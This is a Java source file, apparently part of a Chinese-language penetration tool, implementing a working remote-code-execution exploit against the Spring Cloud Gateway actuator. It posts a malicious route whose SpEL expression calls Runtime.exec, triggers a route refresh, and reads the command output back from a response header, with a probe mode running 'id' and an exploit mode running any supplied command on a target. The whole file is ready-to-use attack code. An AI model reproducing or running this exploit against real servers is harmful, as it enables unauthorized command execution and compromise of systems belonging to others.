package src.main.module;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class SpringGawRCE {
    public String address;
    public String command;
    public String poc;
    public String pocData =
                    "{\n" +
                    "  \"id\": \"poctest\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(" +
                    "T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://example.com\"\n" +
                    "}";
    public String expData =
            "{\n" +
                    "  \"id\": \"expvul\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(" +
                    "T(java.lang.Runtime).getRuntime().exec(new String[]{%s}).getInputStream()))}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://example.com\"\n" +
                    "}";
    public String[] processCommand(String command) {
        return command.split(" ");
    }
    public String constructExpData(String command) {
        String[] commandArray = processCommand(command);
        // 将参数数组转换为符合 Java 语法的字符串形式
        String commandString = Arrays.stream(commandArray)
                .map(arg -> "\\\"" + arg + "\\\"") // 确保每个参数都用引号括起来
                .collect(Collectors.joining(", "));
        // 构造最终的 expData 字符串
        return String.format(expData, commandString);
    }
    public SpringGawRCE(String address, String command) {
        this.address = address;
        this.command = command;
    }
    public SpringGawRCE(String address){
        this.address = address;
    }

    public Stream<String> GawExp() throws IOException{
        Stream.Builder<String> builder = Stream.builder();
        String api = "";
        String data = "";
        String res = "";
        if (command == null) {
            api = "/actuator/gateway/routes/poctest";
            data = pocData;
        }else{
            api = "/actuator/gateway/routes/expvul";
            data = constructExpData(command);
        }
        String refapi = "/actuator/gateway/refresh";
        String site = address + api;
        URL urlobj = new URL(site);
        HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream()) {
            byte[] input = data.getBytes("utf-8");
            os.write(input, 0, input.length);
        }
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_CREATED){
            String site1 = address + refapi;
            URL urlobj1 = new URL(site1);
            HttpURLConnection conn1 = (HttpURLConnection) urlobj1.openConnection();
            conn1.setRequestMethod("POST");
            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            conn1.setDoOutput(true);
            int responseCode1 = conn1.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_OK){
                URL urlobj2 = new URL(site);
                HttpURLConnection conn2 = (HttpURLConnection) urlobj2.openConnection();
                conn2.setRequestMethod("GET");
                conn2.setDoOutput(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
                String inputLine;
                StringBuilder content = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                    res = inputLine.toString();
                }
                int responseCode2 = conn2.getResponseCode();
                if (responseCode2 == HttpURLConnection.HTTP_OK){
                    if (!res.contains("poctest")) {
                        String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                        Pattern pattern = Pattern.compile(resultPattern);
                        Matcher matcher = pattern.matcher(content.toString());
                        if (matcher.find()) {
                            String result = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
                            builder.add(result);
                        }
                    }else {
                        builder.add(address + " " + "存在RCE漏洞!");
                    }
                }else{
                    builder.add("POST request failed with response code: " + responseCode1);
                }
                in.close();
            }
        }
        return builder.build();
    }
}